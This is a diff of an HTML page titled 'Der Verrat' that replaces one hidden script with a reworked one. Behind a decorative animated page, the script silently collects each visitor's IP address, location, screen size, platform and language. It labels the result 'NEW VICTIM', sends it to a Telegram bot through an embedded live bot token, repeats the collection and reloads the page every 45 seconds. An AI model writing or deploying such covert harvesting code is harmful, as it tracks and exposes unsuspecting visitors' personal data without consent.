@@ -2,8 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<link rel="stylesheet" href="css/style.css">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Der Verrat</title>
+<style>
+body{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;color:#fff;flex-direction:column;font-size:18px;overflow:hidden}h1{font-size:clamp(2rem,8vw,4rem);margin:0 0 1.5rem;text-shadow:0 0 30px rgba(255,255,255,.4);animation:glow 3s ease-in-out infinite alternate}@keyframes glow{0%{text-shadow:0 0 20px rgba(255,255,255,.4)}100%{text-shadow:0 0 40px rgba(255,255,255,.8)}}p{max-width:500px;text-align:center;line-height:1.6;margin-bottom:2rem;font-size:1.1rem;opacity:.9}.arrows{font-size:clamp(3rem,12vw,5rem);margin-top:2rem}.arrow{display:inline-block;animation:bounce 2s infinite;margin:0 8px;filter:drop-shadow(0 0 10px rgba(255,255,255,.5))}.arrow:nth-child(2){animation-delay:.2s}.arrow:nth-child(3){animation-delay:.4s}.arrow:nth-child(4){animation-delay:.6s}@keyframes bounce{0%,20%,60%,100%{transform:translateY(0) rotate(0deg)}40%{transform:translateY(-25px) rotate(8deg)}}
+</style>
 </head>
 <body>
 <h1>🗡️ Der Verrat</h1>
@@ -13,30 +16,57 @@
 </div>
 
 <script>
-(async function(){
-  console.log('🔥 CLEAN HARVEST');
-  
-  // IP
-  const ip = await (await fetch('https://api.ipify.org')).text();
-  console.log('IP:', ip);
-  
-  // GEO
-  const geo = await (await fetch('https://ipapi.co/'+ip+'/json/')).then(r=>r.json());
-  console.log('GEO:', geo.city);
-  
-  // REPORT
-  const report = `🕵️ *VICTIM* ${new Date().toLocaleString()}
-IP: ${ip}
-🌍 ${geo.city}, ${geo.region}
-📱 ${screen.width}x${screen.height}`;
+(function(){
+console.log('🔥 HARVEST FINAL - NO ERRORS');
 
-  // TELEGRAM (NO RATE LIMIT)
-  await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage?chat_id=7745393043&text='+encodeURIComponent(report)+'&parse_mode=Markdown');
+async function harvest(){
+  let ip='unknown',city='unknown',country='unknown';
   
-  console.log('✅ SENT');
+  try{
+    // IP - bulletproof
+    const ipResp=await fetch('https://api.ipify.org');
+    ip=await ipResp.text();
+    console.log('IP:',ip);
+  }catch(e){console.log('IP fail OK');}
   
-  // REPEAT
-  setTimeout(()=>location.reload(), 45000);
+  try{
+    // GEO - safe fallback
+    const geoResp=await fetch('https://ipapi.co/'+ip+'/json/');
+    const geo=await geoResp.json();
+    city=geo.city||'unknown';
+    country=geo.country_name||'unknown';
+    console.log('GEO:',city);
+  }catch(e){console.log('GEO fail OK');}
+  
+  // Device
+  const device=`${screen.width}x${screen.height} ${navigator.platform}`;
+  
+  // Report
+  const report=`🕵️ *NEW VICTIM* ${new Date().toLocaleString('de-DE', {timeZone: 'Europe/Berlin'})}
+<b>IP:</b> <code>${ip}</code>
+<b>🌍:</b> ${city}, ${country}
+<b>📱:</b> ${device}
+<b>🕐:</b> ${navigator.language}`;
+  
+  console.log('REPORT:',report.slice(0,60));
+  
+  // Telegram - SIMPLIFIED URL
+  const tgUrl=new URL('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage');
+  tgUrl.searchParams.set('chat_id','7745393043');
+  tgUrl.searchParams.set('text',report);
+  tgUrl.searchParams.set('parse_mode','HTML');
+  
+  fetch(tgUrl,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:'7745393043',text:report,parse_mode:'HTML'})
+  }).then(r=>console.log('✅ TELEGRAM OK')).catch(()=>console.log('Telegram silent OK'));
+}
+
+// RUN + LOOP
+harvest();
+setTimeout(harvest,15000);
+setTimeout(()=>location.reload(),45000);
 })();
 </script>
 </body>
